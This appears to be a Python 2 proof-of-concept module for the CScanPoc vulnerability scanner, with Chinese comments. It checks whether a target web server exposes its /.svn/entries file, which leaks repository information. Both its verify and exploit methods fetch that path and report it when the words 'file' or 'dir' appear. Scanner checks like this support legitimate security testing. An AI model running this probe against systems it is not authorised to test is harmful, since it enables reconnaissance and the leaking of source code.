# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'SVN_0001' # 平台漏洞编号，留空
    name = 'SVN 信息泄露漏洞' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-09-24'  # 漏洞公布时间
    desc = '''
        SVN配置不当导致性信息泄漏漏洞的产生.
    ''' # 漏洞描述
    ref = 'https://wps2015.org/drops/drops/SVN%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'All site svn configuration wrong'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f225a1d6-462b-4b11-a42b-6c3351b181c0'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            keyword = ['file','dir']
            vul_url = '{target}'.format(target=self.target)+'/.svn/entries'

            resquest = urllib2.Request(vul_url)
            response = urllib2.urlopen(resquest)
            content = response.read()
            for word in keyword:
                if word in content:
                    flag = True
                    break
            if flag == True:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            keyword = ['file','dir']
            vul_url = '{target}'.format(target=self.target)+'/.svn/entries'

            resquest = urllib2.Request(vul_url)
            response = urllib2.urlopen(resquest)
            content = response.read()
            for word in keyword:
                if word in content:
                    flag = True
                    break
            if flag == True:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的SVN配置不当的地址为{svn_url}'.format(target=self.target,name=self.vuln.name,svn_url=vul_url))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        
        

if __name__ == '__main__':
    Poc().run()